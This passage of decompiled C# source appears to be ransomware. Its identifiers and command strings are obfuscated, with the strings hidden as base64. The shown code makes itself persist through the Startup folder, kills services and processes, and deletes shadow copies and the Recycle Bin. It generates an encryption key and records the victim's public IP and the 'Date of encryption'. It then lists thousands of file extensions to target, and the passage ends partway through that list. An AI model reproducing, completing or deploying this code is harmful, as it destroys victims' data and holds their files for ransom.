				new HKXaSVvJYmnnLdA().wyShdSIjao(zTwfKOfmhIzf: false);
				sDEurotmlSp.xHdDRbHAgWISJ();
			}
		}
		catch (Exception)
		{
		}
		if (MztasMLQahx == "YES" && sDEurotmlSp.wUNkGYGntmxQr())
		{
			new HKXaSVvJYmnnLdA().wyShdSIjao(zTwfKOfmhIzf: false);
			new HKXaSVvJYmnnLdA().kVVXMvfOFStHR();
		}
		if (onQslztdxu == "YES")
		{
			laKYzFlShMQQKbT.cIQuQhuxPf();
		}
		try
		{
			ProcessModule mainModule = Process.GetCurrentProcess().MainModule;
			string fileName = mainModule.FileName;
			string text = Environment.GetFolderPath(Environment.SpecialFolder.Startup) + "\\";
			string text2 = text + Path.GetFileName(fileName);
			if (vwlpfQdKdIao == "YES" && fileName != text2)
			{
				Thread thread2 = new Thread(UquwWAWwbeXBjt);
				thread2.IsBackground = true;
				thread2.Priority = ThreadPriority.Normal;
				thread2.Start();
			}
			if (dIUHDQQEAOa == "YES" && mainModule != null && fileName != text2)
			{
				try
				{
					oVEAITZFiruecGzH = sIHGzVGFvNlp(0, svXEViIqXeH.Count);
					File.Copy(fileName, text + svXEViIqXeH[oVEAITZFiruecGzH], overwrite: true);
					Process.Start(text + svXEViIqXeH[oVEAITZFiruecGzH]);
					orYmYqWIcxewG();
					Process.GetCurrentProcess().Kill();
				}
				catch (Exception)
				{
				}
			}
		}
		catch (Exception)
		{
		}
		try
		{
			if (ZTdztQaAOyr == "YES" && DateTime.Now < JjjCfPpnauLH)
			{
				return;
			}
		}
		catch
		{
		}
		try
		{
			if (iRObUsTjwrSWxLpsJvO == "YES" && DateTime.Now > dEUOVBrnPjH)
			{
				orYmYqWIcxewG();
			}
		}
		catch
		{
		}
		lAQhAZUHqKD();
		Thread thread3 = new Thread((ThreadStart)delegate
		{
			Parallel.ForEach(maWbHytheKDQ, delegate(string JjujZBoghWPTnB)
			{
				bhxKBVXCniiAP(agZtqMkMayfivgE("c2MuZXhl"), JjujZBoghWPTnB);
			});
			Parallel.ForEach(qvNSfDETWfhXrQd, delegate(string EjBKoFvFxVEen)
			{
				bhxKBVXCniiAP(agZtqMkMayfivgE("dGFza2tpbGwuZXhl"), EjBKoFvFxVEen);
			});
			if (XuXlSigPgmIZZk == "YES")
			{
				Parallel.ForEach(VTOPORIJkY, delegate(string MGuJEjiqponW)
				{
					bhxKBVXCniiAP(agZtqMkMayfivgE("dGFza2tpbGwuZXhl"), "/IM " + MGuJEjiqponW + " /f");
				});
			}
			if (!jxLIBcytJQJnAi().Contains("XP"))
			{
				CHjkcYzdJSQ(KKjdYuiUauDNY);
			}
			else
			{
				Parallel.ForEach(SBrBsecLKNoTe, delegate(string wmqQgbkmyH)
				{
					bhxKBVXCniiAP(agZtqMkMayfivgE(pQwJuYtkrVyfmA("lhXZu4WatRWYzNnd")), wmqQgbkmyH);
				});
			}
			Parallel.ForEach(SnnXjQNEXDYsoF, delegate(string GWZhvKvaSfQYDuI)
			{
				bhxKBVXCniiAP(agZtqMkMayfivgE("ZGVsLmV4ZQ=="), GWZhvKvaSfQYDuI);
			});
		});
		thread3.Priority = ThreadPriority.Normal;
		thread3.IsBackground = true;
		thread3.Start();
		try
		{
			if (File.Exists(Path.Combine(Directory.GetCurrentDirectory(), "Config.enc")))
			{
				string[] array = File.ReadAllLines(Path.Combine(Directory.GetCurrentDirectory(), "Config.enc"));
				string[] array2 = array;
				foreach (string text3 in array2)
				{
					if (text3.Contains("PriorityPath="))
					{
						string text4 = text3.Split(new char[1] { '=' })[1].Trim();
						if (!string.IsNullOrEmpty(text4))
						{
							string[] array3 = text4.Split(new char[1] { ',' });
							foreach (string text5 in array3)
							{
								string text6 = text5.Trim();
								if (Directory.Exists(text6) && !ykYiTFCYjtGh.Contains(text6) && text6 != "X:\\CustomPath1" && text6 != "Z:\\CustomPath2" && text6 != "\\\\Domain\\Path\\Folder")
								{
									ykYiTFCYjtGh.Add(text6);
								}
							}
						}
					}
					if (text3.Contains("Network="))
					{
						string text7 = text3.Split(new char[1] { '=' })[1].Trim();
						if (!string.IsNullOrEmpty(text7) && text7.ToLower() == "true")
						{
							oyEKVgjWAAFWE = "YES";
						}
						else if (!string.IsNullOrEmpty(text7) && text7.ToLower() == "false")
						{
							oyEKVgjWAAFWE = "NO";
						}
					}
					if (text3.Contains("ConsoleMode="))
					{
						string text8 = text3.Split(new char[1] { '=' })[1].Trim();
						if (!string.IsNullOrEmpty(text8) && text8.ToLower() == "true")
						{
							hzzRDIjGDyq = true;
						}
						else if (!string.IsNullOrEmpty(text8) && text8.ToLower() == "false")
						{
							hzzRDIjGDyq = false;
						}
					}
					if (text3.Contains("DebugLog="))
					{
						string text9 = text3.Split(new char[1] { '=' })[1].Trim();
						if (!string.IsNullOrEmpty(text9) && text9.ToLower() == "true")
						{
							bZJnUpHOpIgqq = true;
						}
						else if (!string.IsNullOrEmpty(text9) && text9.ToLower() == "false")
						{
							bZJnUpHOpIgqq = false;
						}
					}
					if (text3.Contains("ImpersonateExplorer="))
					{
						string text10 = text3.Split(new char[1] { '=' })[1].Trim();
						if (!string.IsNullOrEmpty(text10) && text10.ToLower() == "true")
						{
							NhUiHaxsDy = true;
						}
						else if (!string.IsNullOrEmpty(text10) && text10.ToLower() == "false")
						{
							NhUiHaxsDy = true;
						}
					}
				}
			}
		}
		catch (Exception ex6)
		{
			if (bZJnUpHOpIgqq)
			{
				try
				{
					File.AppendAllText(SlCyjezmzcjRF, "Configuration text file error: " + ex6.Message);
				}
				catch (Exception)
				{
				}
			}
		}
		if (oyEKVgjWAAFWE == "NO")
		{
			OKJeKejfXkZJUmj();
		}
		if (oyEKVgjWAAFWE == "YES")
		{
			try
			{
				udvmXwBMJqDyi();
			}
			catch
			{
			}
		}
		try
		{
			if (new WindowsPrincipal(WindowsIdentity.GetCurrent()).IsInRole(WindowsBuiltInRole.Administrator) && bNHOcWPoAIFRY)
			{
				try
				{
					Thread thread4 = new Thread(tuPuwpgXKDpeff.AAtnGPRDgawVHv);
					thread4.IsBackground = true;
					thread4.Start();
				}
				catch
				{
				}
			}
		}
		catch (Exception)
		{
		}
		if (new WindowsPrincipal(WindowsIdentity.GetCurrent()).IsInRole(WindowsBuiltInRole.Administrator))
		{
			bhxKBVXCniiAP("cmd.exe", agZtqMkMayfivgE("L2MgcmQgL3MgL3EgJVNZU1RFTURSSVZFJVxcJFJlY3ljbGUuYmlu"));
		}
		if (rRwjmRsxcOt == "YES" && WjrMMpCSUiWI() && new WindowsPrincipal(WindowsIdentity.GetCurrent()).IsInRole(WindowsBuiltInRole.Administrator))
		{
			Thread thread5 = new Thread(ULIHMIqJVuh.JxUftoGDnZPe);
			thread5.IsBackground = false;
			thread5.Priority = ThreadPriority.Normal;
			thread5.Start();
		}
		_ = fRgGjXEozID == "YES";
		SecureString secureString = new SecureString();
		if (hzumHfYGXpfXpx == "NO")
		{
			FdUEgPawbnib = OAYXVHDzPgdFHv.XHZvUIhBlcoaY(32);
			yWaizfdbSvLTf = OAYXVHDzPgdFHv.WsldrQcqYAlmUzOPt();
		}
		else
		{
			FdUEgPawbnib = "CBNEFW5AXX8G2PZZ3XBJUOVFLY5GGDPU";
		}
		DYXHJtaAOAj = DDUEkMsefa.PFPBRyzXpmMZne(FdUEgPawbnib + yWaizfdbSvLTf);
		if (KOWNRAOhNTbHh == "YES")
		{
			RUReOJudlAtO();
		}
		if (hmNsKOlRtpeG)
		{
			try
			{
				if (!File.Exists(Path.Combine(Directory.GetCurrentDirectory(), uLoFxWVggAfF)))
				{
					File.WriteAllText(Path.Combine(Directory.GetCurrentDirectory(), uLoFxWVggAfF), string.Concat(agZtqMkMayfivgE("Q2xpZW50IElQOiA="), new WebClient().DownloadString(agZtqMkMayfivgE("aHR0cDovL2ljYW5oYXppcC5jb20=")), "\r\n", agZtqMkMayfivgE("RGF0ZSBvZiBlbmNyeXB0aW9uOiA="), DateTime.Now, "\r\n", agZtqMkMayfivgE("Q2xpZW50IFVuaXF1ZSBJZGVudGlmaWVyIEtleTog"), DYXHJtaAOAj));
				}
				else
				{
					File.AppendAllText(Path.Combine(Directory.GetCurrentDirectory(), uLoFxWVggAfF), "\r\nAdditional KeyID: " + DYXHJtaAOAj);
				}
			}
			catch (Exception ex9)
			{
				if (bZJnUpHOpIgqq)
				{
					try
					{
						File.AppendAllText(SlCyjezmzcjRF, "Error while creating Local Report: " + ex9.Message + "\r\n");
					}
					catch (Exception)
					{
					}
				}
			}
		}
		iIRJTxOmFBmo.PuXzjaLIEasSjuh(Path.Combine(Environment.GetFolderPath(Environment.SpecialFolder.Startup), ZJFGqhHHen), tmlfgLSyxZfPglA(DYXHJtaAOAj), null, null, "Installer...", "Ctrl+Shift+X", null);
		if (new WindowsPrincipal(WindowsIdentity.GetCurrent()).IsInRole(WindowsBuiltInRole.Administrator))
		{
			EAklTDrcJZHndQSS();
		}
		try
		{
			try
			{
				if (hzzRDIjGDyq)
				{
					Console.WriteLine("Files securing is about to start...");
				}
			}
			catch
			{
			}
			qLhCDLYchRKzR(new string[1] { "[auto]" }, new string[4823]
			{
				"db", "dbf", "accdb", "dbx", "mdb", "mdf", "epf", "ndf", "ldf", "1cd",
				"sdf", "nsf", "fp7", "cat", "log", "$$$", "$db", "$efs", "$er", "^^^",
				"__a", "__b", "{pb", "~cw", "~hm", "0", "000", "001", "1", "101",
				"103", "108", "110", "113", "123", "128", "17t", "1CD", "1pe", "1ph",
				"1sp", "1st", "2", "2mg", "2Q0", "2QM", "3", "3d", "3d4", "3dd",
				"3df", "3df8", "3dm", "3dmdef", "3dp", "3dr", "3ds", "3dt", "3dw", "3dxml",
				"3fr", "3g2", "3ga", "3gp", "3gp2", "3me", "3MF", "3mm", "3pe", "3pr",
				"3w", "4dd", "4dl", "4dv", "4fs", "4w7", "5vw", "602", "73b", "73c",
				"73l", "7z", "7z001", "7z002", "7zip", "8", "86f", "89t", "89y", "8ba",
				"8bc", "8be", "8bf", "8bi8", "8bl", "8bs", "8bx", "8by", "8li", "8svx",
				"8xg", "8xk", "8xs", "8xt", "8xv", "9xt", "9xy", "a$v", "a00", "a01",
				"a02", "a2c", "a5l", "a5w", "a65", "aa", "aa3", "aac", "aaf", "aah",
				"aam", "aao", "aaui", "ab", "ab1", "ab3", "ab4", "ab65", "aba", "abbu",
				"abc", "abcd", "abf", "abi", "abk", "abkprj", "abp", "abt", "abw", "aby",
				"ac2", "ac3", "ac5", "aca", "acc", "accdc", "accde", "accdr", "accdt", "accft",
				"ACCTB", "ace", "acf", "acg", "ach", "ACL", "acp", "acq", "acr", "acrobatsecuritysettings",
				"acrodata", "acroplugin", "acrypt", "act", "acz", "ad", "ada", "adb", "adc", "adcp",
				"add", "addism", "ade", "adf", "adi", "adif", "adoc", "ados", "adox", "adp",
				"adpb", "adr", "ads", "adt", "adu", "adv", "advs", "adx", "adz", "aea",
				"aec", "aep", "aepx", "aes", "aet", "afd", "afdesign", "afe", "aff", "afi",
				"afm", "afp", "aft", "agd", "agd1", "agdl", "age3rec", "age3sav", "age3scn", "age3xrec",
				"age3xsav", "age3xscn", "age3yrec", "age3ysav", "age3yscn", "aggr", "ahf", "ai", "aif", "aifb",
				"aiff", "aim", "ain", "AIO", "aip", "ais", "ait", "ak", "al", "al8",
				"ala", "alb3", "alb4", "alb5", "alb6", "alc", "ald", "aldf", "alf", "ali",
				"allet", "alt3", "alt5", "alz", "AM", "amb", "amc", "amf", "aml", "amm",
				"amr", "amsorm", "amt", "amu", "amx", "amxx", "an1", "an8", "anime", "anl",
				"anme", "ann", "ans", "ansr", "ansym", "anx", "aoi", "ap", "apa", "apalbum",
				"apd", "ape", "apf", "aph", "api", "apj", "apk", "aplibrary", "apnx", "apo",
				"app", "APPCACHE", "approj", "APPX", "apr", "apt", "apw", "apxl", "apz", "ar",
				"arc", "arch00", "archiver", "arduboy", "arff", "ari", "arj", "arn", "aro", "arr",
				"ars", "art", "arw", "as", "as$", "as3", "asa", "asc", "ascm", "ascx",
				"asd", "ase", "asf", "ashbak", "ashdisc", "ashprj", "ashx", "ask", "asl", "asm",
				"asmx", "asn", "asnd", "asp", "aspx", "asr", "asset", "ast", "asv", "asvx",
				"asx", "atf", "ath", "atl", "atomsvc", "atr", "ats", "atw", "automaticdestinations-ms", "aux",
				"av", "avc", "avhd", "avhdx", "avj", "avl", "avn", "avp", "avs", "AW",
				"awb", "awbr", "awd", "awdb", "awe", "awg", "awp", "aws", "awt", "aww",
				"awwp", "ax", "azf", "azs", "azw", "azw1", "azw3", "azw4", "azz", "azzx",
				"b", "b1", "b27", "b2a", "b5i", "b5t", "b64", "b6i", "b6t", "b6z",
				"ba", "ba6", "ba7", "ba8", "ba9", "bac", "back", "backup", "backupdb", "bad",
				"bafl", "bak", "bak~", "bak2", "bak3", "bakx", "bamboopaper", "bank", "bar", "baserproj",
				"bau", "bax", "bay", "bbb", "bbcd", "bbl", "bbprojectd", "bbs", "bbxt", "bbz",
				"bc", "bc5", "bc6", "bc7", "bcc", "bcd", "bci", "bck", "bckp", "bcl",
				"bcm", "bcp", "bct", "bdb", "bdb2", "bdc", "bdf", "bdic", "bdoc", "bdp",
				"bdr", "bdt2", "bdt3", "bean", "bed", "bfa", "bff", "bfx", "bgl", "bgt",
				"bgv", "bh", "bho", "bi8", "bib", "bibtex", "bic", "bif", "bifx", "big",
				"bik", "bil", "bim", "bin", "bina", "binary", "bionix", "BIT", "bizdocument", "bjl",
				"bjo", "bk", "bk!", "bk1", "bk2", "bk3", "bk4", "bk5", "bk6", "bk7",
				"bk8", "bk9", "bkc", "bkf", "bkg", "bkp", "bks", "bkup", "bkz", "blb",
				"bld", "blend", "blend1", "blend2", "blg", "blk", "blm", "bln", "blob", "blockplt",
				"blogthis", "blp", "bluebutton", "bm2", "bm3", "bmc", "bmf", "bmk", "bml", "bmm",
				"bmml", "bmpr", "bms", "bna", "bndl", "bnk", "boc", "bok", "boo", "book",
				"bookexport", "bop", "box", "bp1", "bp2", "bp3", "bpa", "bpb", "bpd", "bpdx",
				"bpf", "bphys", "bpj", "bpk", "bpl", "bplx", "bpm", "bpmc", "bpn", "bps",
				"bpw", "brain", "brd", "breaking_bad", "brf", "brh", "brl", "brn", "BROWSER", "brs",
				"brw", "brx", "bsa", "bsd", "bsdl", "bsk", "bso", "bsp", "bst", "btd",
				"btf", "btif", "btinstall", "BTL", "btm", "btoa", "btr", "btx", "BUD", "bul",
				"bundle", "bup", "burn", "burntheme", "bvd", "bvp", "bwa", "bwd", "bwf", "bwi",
				"bwp", "bws", "bwt", "bwz", "BXF", "bxx", "bz", "bz2", "bza", "bzabw",
				"bzip", "bzip2", "c", "c00", "c01", "c02", "c10", "c2e", "c3d", "c4p",
				"c6", "cadoc", "cae", "caf", "cag", "calca", "cam", "camm", "camproj", "cap",
				"capt", "capx", "car", "caro", "cas", "catproduct", "cav", "cawr", "cb7", "cba",
				"cbf", "cbg", "cbmap", "cbor", "cbr", "cbs", "cbt", "cbu", "cbz", "cc",
				"cca", "ccc", "ccd", "ccf", "cch", "ccitt", "ccld", "ccp", "cct", "cd",
				"cd1", "cd2", "cdb", "cdc", "cdd", "cddz", "cdf", "cdi", "cdk", "cdl",
				"cdm", "cdml", "cdmm", "cdmz", "cdp", "cdpz", "cdr", "cdr3", "cdr4", "cdr5",
				"cdr6", "cdrw", "cds", "cdt", "cdtx", "cdx", "cdxml", "ce1", "ce2", "cef",
				"cel", "celtx", "cenon~", "cer", "cert", "cf", "cf5", "cfa", "cfb", "cfd",
				"cfg", "cfp", "cfr", "cfs", "cfx", "cgf", "cgfiletypetest", "cgi", "cgm", "cgp",
				"chg", "chi", "chk", "chm", "chml", "chmprj", "chp", "chpscrap", "CHR", "cht",
				"chtml", "cib", "cida", "cif", "cipo", "circ", "ciso", "civ4worldbuildersave", "civbeyondswordsave", "ck9",
				"ckp", "ckt", "cl2", "cl2arc", "cl2doc", "cl5", "clam", "clarify", "class", "classlist",
				"clb", "cld", "clg", "clix", "clk", "clkd", "clkm", "clks", "clkt", "clktk",
				"clkv", "clm", "clp", "clr", "cls", "clx", "cm10", "cm5", "cma", "cmap",
				"CMB", "cmbl", "cmf", "cml", "cmp", "cmr", "cms", "cmt", "cmu", "cna",
				"cnf", "cng", "cnt", "cnv", "cod", "col", "collab", "comicdoc", "comiclife", "COMMENTS",
				"compositionmodel", "compositiontemplate", "con", "conf", "config", "contact", "converterx", "cp", "cp9", "CPA",
				"cpaa", "cpc", "cpd", "cpdt", "cpf", "cpgz", "cphd", "cpi", "cpio", "cpk",
				"cpmz", "cpp", "cpt", "cptx", "cpy", "cr2", "cram", "crashed", "craw", "crb",
				"crd", "crds", "creole", "crev", "cri", "crjoker", "crs", "crs3", "crt", "crtr",
				"crtx", "crw", "crwl", "cry", "crypt", "crypt12", "crypt8", "crypt9", "crypted", "cryptowall",
				"cryptra", "cs", "cs8", "csa", "csd", "cse", "CSG", "csh", "csi", "csl",
				"csm", "cso", "csp", "csr", "css", "cst", "csv", "ctb", "ctbl", "ctd",
				"cte", "ctf", "CTG", "ctl", "ctm", "ctp", "ctproject", "ctt", "ctv", "ctv3",
				"ctx", "ctxt", "cty", "cub", "cube", "cue", "current", "cursorfx", "curxptheme", "cva",
				"cvd", "cvj", "cvl", "cvn", "cvw", "cw3", "cwf", "cwk", "cwn", "cwr",
				"cws", "cww", "cwwp", "cxa", "cxarchive", "cxd", "cxf", "cxr", "cxt", "cyi",
				"cyo", "cys", "czi", "czip", "czp", "d", "d00", "d01", "d3dbsp", "d64",
				"d88", "da0", "da2", "daa", "dac", "dacpac", "dad", "dadiagrams", "dadx", "daf",
				"dag", "dal", "dam", "dao", "dap", "dar", "das", "daschema", "dash", "dat",
				"DATA", "database", "datx", "dax", "dayzprofile", "dazip", "db_journal", "db0", "db3", "dba",
				"dbb", "dbc", "dbcrypt12", "dbcrypt8", "dbd", "DBF", "dbfv", "dbgsym", "db-journal", "dbk",
				"dbr", "dbs", "db-shm", "dbt", "dbv", "db-wal", "dc2", "dc4", "dca", "dcb",
				"dcd", "dcf", "dch", "dcl", "dcm", "dcmd", "dcmf", "dco", "dcp", "dcpf",
				"dcpr", "dcr", "dcs", "dct", "dct5", "dcu", "dcx", "dd", "ddb", "ddc",
				"ddcx", "ddd", "ddf", "ddif", "ddl", "ddoc", "ddrw", "dds", "ddt", "deb",
				"debian", "dec", "ded", "def", "default", "del", "dem", "DEP", "deproj", "der",
				"des", "desc", "description", "design", "desklink", "det", "deu", "dev", "develve", "deviceinfo",
				"dex", "dfe", "dfl", "dfm", "dfproj", "dft", "dfti", "dgc", "dgm", "DGML",
				"dgpd", "dgr", "dgrh", "dgs", "dhcd", "dhe", "dia", "dic", "dict", "did",
				"dif", "dig", "dii", "dim", "dime", "dip", "dir", "directory", "disc", "disco",
				"disk", "dist", "dit", "dita", "ditamap", "ditaval", "divx", "diz", "djbz", "djv",
				"djvu", "dk@p", "dkt", "dl", "dl_", "dlc", "dlg", "dlis", "dlt", "dltemp",
				"dm2", "dmbk", "dmc", "dmg", "dmgpart", "dmm", "dmmx", "dmo", "dmp", "dmpr",
				"dmr", "dms", "dmsp", "dmtemplate", "dmv", "dna", "dng", "dnl", "dob", "doc",
				"doc#", "docb", "doce", "docenx", "dochtml", "dockzip", "docl", "docm", "docmhtml", "docs",
				"docset", "docstates", "doct", "documentrevisions-v100", "docx", "docxl", "docxml", "dok", "dot", "dothtml",
				"dotm", "dotmenx", "dotx", "dotxenx", "dox", "doxy", "doz", "dp", "dp1", "dpb",
				"DPC", "dpd", "dpi", "dpk", "dpl", "dpn", "dpr", "dps", "dpt", "dpx",
				"dqy", "dr", "drd", "dream", "drf", "drl", "drm", "drmx", "drmz", "drscan",
				"drw", "dsb", "dsc", "dsd", "dsdic", "dsf", "dsg", "dsk", "dsl", "dsn",
				"dsp", "dss", "dsx", "dsy", "dsz", "dt", "dta", "dtd", "dtm", "dtml",
				"dtp", "dtr", "dtsx", "dtx", "dump", "dupeguru", "dvb", "dvc", "dvd", "dvdproj",
				"dvds", "dvi", "dvo", "dvs", "dvx", "dvz", "dwd", "dwdoc", "dwf", "dwfx",
				"dwg", "dwi", "dwlibrary", "dwp", "dws", "dwt", "dxb", "dxd", "dxe", "dxf",
				"dxg", "dxl", "dxn", "dxp", "dxr", "dxstudio", "dz", "dzp", "e01", "e2p",
				"e3s", "e4a", "eap", "eas", "easmx", "ebk", "ebm", "ebs", "ebuild", "ec0",
				"ec3", "ec4", "ecc", "ecl", "ecm", "eco", "ecr", "ecs", "ecsbx", "ect",
				"ecx", "eda", "edat", "edat2", "edb", "edd", "ede", "edf", "edfx", "edg",
				"edi", "edk", "edl", "edml", "edn", "edoc", "edq", "edrwx", "eds", "edt",
				"edv", "edz", "eep", "ef", "efa", "efax", "eff", "efl", "efm", "efp",
				"efr", "eftx", "efu", "efw", "efx", "egg", "eglib", "egp", "egr", "egt",
				"ehp", "eif", "eip", "ekb", "ekm", "el6", "eld", "elf", "elfo", "eln",
				"els", "em", "emb", "embl", "emc", "emd", "emf", "eml", "emlxpart", "emm",
				"emrg", "emrg2", "enc", "enciphered", "encrypted", "enex", "enfpack", "enl", "enlx", "enq",
				"ent", "env", "enw", "enx", "enyd", "eob", "eot", "ep", "epdf", "EPF",
				"epi", "epim", "epk", "epp", "eprtx", "eps", "epsf", "ept", "epub", "epw",
				"eql", "er1", "erbsql", "erd", "ere", "erf", "erg", "erp", "err", "ersx",
				"es", "es2", "es3", "esb", "esc", "esd", "ese", "esf", "esm", "esp",
				"esq", "ess", "est", "esv", "esx", "et", "ete", "etng", "etnt", "ets",
				"ett", "etx", "euc", "eui", "ev", "EV1", "EV2", "EV3", "ev3p", "ev3s",
				"evo", "evx", "evy", "ewl", "ews", "ex", "ex01", "exb", "exc", "exd",
				"exf", "exif", "exl", "exm", "exp", "exprwdhtml", "exprwdxml", "exx", "ez", "ezc",
				"ezm", "ezs", "ezz", "f", "f04", "f06", "f3z", "f4v", "f90", "f96",
				"fa", "fac", "fadein", "fae", "familyfile", "faq", "far", "fas", "fasta", "fax",
				"fbc", "fbd", "fbf", "fbk", "fbp6", "fbq", "fbs", "fbu", "fbw", "fcd",
				"fcf", "fcpbundle", "fcpevent", "fcpproject", "fcpxdest", "fcpxml", "fcs", "fcstd", "fct", "fd",
				"fdb", "fdd", "fdf", "fdi", "fdm", "fdoc", "fdp", "fdr", "fds", "fdseq",
				"fdt", "fdw", "fdx", "FE", "fed", "feed-ms", "feedsdb-ms", "fes", "ff", "ffa",
				"ffd", "ffdata", "fff", "ffindex", "ffl", "ffo", "fft", "ffwp", "ffx", "fg3",
				"fh", "fhc", "fhd", "fhf", "fic", "fid", "fig", "fil", "fin", "fingnet",
				"fl", "fla", "flac", "flag", "flam3", "flame", "flat", "flf", "flg", "flib",
				"flipchart", "flk", "flka", "flkb", "fll", "flm", "flo", "flow", "flp", "fls",
				"flt", "fltr", "flv", "flvv", "flwa", "fly", "fm", "fm3", "fmat", "fmc",
				"fmd", "fmf", "fml", "fmp", "fmp12", "fmp3", "fmpsl", "fmt", "fnbk", "fnf",
				"fnm", "fnrecipes", "fo", "fob", "fodg", "fodp", "fods", "fodt", "fol", "folio",
				"folx", "fop", "for", "forge", "fos", "fountain", "fox", "fp", "fp3", "fp4",
				"fp5", "fp8", "fpa", "fpage", "fpdoclib", "fpenc", "fphomeop", "fpk", "fplinkbar", "fpp",
				"fpr", "fpsl", "fpsx", "fpt", "fpx", "fqc", "fra", "frag", "frameset", "frd",
				"frdat", "frdoc", "freepp", "frelf", "frl", "frm", "fro", "fs", "fsa", "fsc",
				"fsd", "fsf", "fsh", "fsif", "fsp", "fss", "fstab", "ft10", "ft11", "ft7",
				"ft8", "ft9", "ftil", "ftl", "ftm", "ftmb", "ftr", "ftw", "ful", "fwbackup",
				"fwdict", "fwk", "fwtemplate", "FX", "fxd", "fxf", "fxg", "fxo", "fxp", "fxr",
				"fza", "fzb", "fzbz", "fzh", "fzip", "fzpz", "g1m", "g3m", "g41", "ga3",
				"gadgeprj", "gal", "gallery", "gam", "gan", "gar", "gb", "gb1", "gb2", "gbi",
				"gbk", "gbl", "gbo", "gbp", "gbr", "gbs", "gc", "gca", "gcd", "gcg",
				"gcproj", "gcsx", "gct", "gcw", "gcx", "gd3", "gdb", "gdbtable", "gdc", "gdf",
				"GDL", "gdoc", "gdrive", "gdt", "gdtb", "ged", "gedata", "gedcom", "gen", "genbank",
				"geo", "gev", "gevl", "gexf", "gfe", "gfi", "gform", "gfs", "gfx", "ggb",
				"ghe", "gho", "ghs", "gi", "gil", "gis", "giw", "gkh", "gla", "gld",
				"glink", "glk", "glo", "glos", "gls", "gly", "gmap", "gmbl", "gml", "gmp",
				"gms", "gmz", "gnd", "gno", "gnp", "gnutar", "gofin", "gp3", "gp4", "gpd",
				"gpf", "gpg", "gpi", "gpj", "gpn", "gpp", "gpr", "gpscan", "gpx", "gpz",
				"gra", "grade", "graphml", "graphmlz", "gray", "grd", "grdb", "grey", "grf", "grib",
				"grib2", "grind", "grindx", "grk", "grle", "groups", "grp", "grr", "grs", "grt",
				"grv", "GRXML", "gry", "gs", "gsa", "gs-bck", "gsf", "gsheet", "gslides", "gsm",
				"GTA", "gtable", "gtar", "gthr", "gtl", "gtm", "gto", "gtp", "gts", "gui",
				"guides", "gul", "gvi", "gwi", "gwk", "gwp", "gxk", "gxl", "gxt", "gz",
				"gz2", "gza", "gzi", "gzig", "gzip", "h", "h10", "h11", "h12", "h13",
				"h14", "h15", "h16", "h17", "h1q", "h1s", "h1w", "h2o", "h2w", "h3m",
				"h4", "h4r", "h5", "h6x", "h77t", "haas", "hal", "haml", "hbk", "hbl",
				"hbx", "hc", "hcc", "hce", "hci", "hcl", "HCP", "hcr", "hcu", "hcw",
				"hcx", "hcxs", "hda", "hdb", "hdd", "hdf", "hdi", "hdl", "hdpmx", "hds",
				"hdt", "hdumx", "hdx", "hed", "help", "helpindex", "HEQ", "hex", "hfd", "hfs",
				"hft", "hfv", "hhs", "hif", "hin", "his", "hjt", "hkdb", "HKF", "hkx",
				"hl", "hlf", "hlp", "hlx", "hlx2", "hlz", "hm2", "hm3", "hml", "hmskin",
				"hmt", "hmxp", "hmxz", "hnd", "hoi4", "hol", "hot", "hp2", "hpd", "hpj",
				"hplg", "hpo", "hpp", "hps", "hpt", "hpw", "hqx", "hrx", "hs", "hs2",
				"hsdt", "hsk", "hsm", "hst", "hsx", "hta", "htb", "htg", "htm", "htm~",
				"html", "htmls", "htmlz", "htms", "htpasswd", "htz5", "huh", "hvc", "HVE", "hvpl",
				"hw3", "hwp", "hwpml", "hwt", "hxe", "hxi", "HXL", "HXN", "hxq", "hxr",
				"hxs", "HXX", "hyp", "hype", "hyv", "i00", "i01", "i02", "i5z", "iab",
				"iaf", "ial", "ias", "ib", "iba", "ibadr", "ibank", "ibb", "ibcd", "ibd",
				"ibdat", "ibg", "ibk", "ibp", "ibq", "ibz", "icalevent", "icaltodo", "icbu", "icc",
				"icf", "icg", "ichat", "icml", "icmt", "ico", "icr", "ics", "icst", "icxs",
				"id2", "id3tag", "idap", "idb", "idc", "idd", "idl", "idml", "idp", "idx",
				"ie5", "ie6", "ie7", "ie8", "ie9", "ies", "ifaith", "iff", "ifiction", "ifm",
				"ifp", "ifs", "igc", "igg", "igma", "ign", "igq", "igr", "ihf", "ihp",
				"ihx", "ii", "iif", "iiq", "iks", "ila", "ildoc", "ilg", "ilogicvb", "ima",
				"image", "imd", "img", "imp", "imr", "imt", "imz", "in", "INBOX", "INC",
				"incp", "incpas", "ind", "indb", "indd", "INDEX", "indl", "indp", "indt", "inf",
				"info", "ink", "inld", "inlk", "inp", "inprogress", "inrs", "ins", "inss", "installhelper",
				"insx", "internetconnect", "inx", "ioca", "iof", "ip", "ipa", "ipalias", "ipd", "ipf",
				"iphoto", "iplb", "ipmeta", "ipr", "iproject", "iq4", "iqmol", "irock", "irp", "irr",
				"irx", "is1", "is2", "isf", "ish1", "ish2", "ish3", "iso", "ispc", "ispx",
				"ist", "isu", "isz", "itdb", "ite", "itl", "itlp", "itm", "itmsp", "itmz",
				"itn", "itp", "its", "itw", "itx", "iup", "iv2i", "ivc", "ivd", "ivs",
				"ivt", "iw", "iw44", "iwa", "iwd", "iwi", "iwm", "iwprj", "iwtpl", "iwxdata",
				"ix", "ix2", "ixa", "ixb", "ixv", "j01", "jac", "jar", "jasper", "jav",
				"java", "jb2", "jbc", "jbi", "jbig", "jbig2", "jbk", "jbr", "jc", "jclic",
				"JCP", "jdat", "jdb", "jdc", "jdd", "jef", "jet", "jfif", "JFM", "jgcscs",
				"jge", "jgz", "jhd", "jiaf", "jias", "jif", "jiff", "jmp", "jnb", "jnt",
				"joboptions", "joe", "joined", "jp1", "jpa", "jpc", "jpe", "jpeg", "jpf", "jpg",
				"jpgx", "jph", "jpm", "jps", "jpw", "jrf", "jrl", "jrprint", "JRS", "jrxml",
				"js", "JS1", "jsd", "jsda", "json", "jsp", "jspa", "jspx", "jtbackup", "jtd",
				"jtdc", "jtt", "JTX", "jude", "just", "jw", "jwl", "jww", "k25", "k3b",
				"kal", "kap", "kb2", "kbd", "kbf", "kbits", "kbs", "kc2", "kdb", "kdbx",
				"kdc", "kde", "kdf", "kdz", "keb", "kelgfile", "kes", "kexi", "kexic", "kexis",
				"key", "keychain", "keynote", "keytab", "key-tef", "kf", "kfm", "kfp", "kgtemp", "kid",
				"kismac", "klq", "klw", "kma", "kms", "kmy", "kmz", "kno", "knt", "kos",
				"kpdx", "kpf", "kpp", "kpr", "kpx", "kpz", "krc", "ksd", "ksm", "ksp",
				"kss", "ksw", "kth", "kuip", "kvtml", "kwd", "kwm", "kwp", "l", "l01",
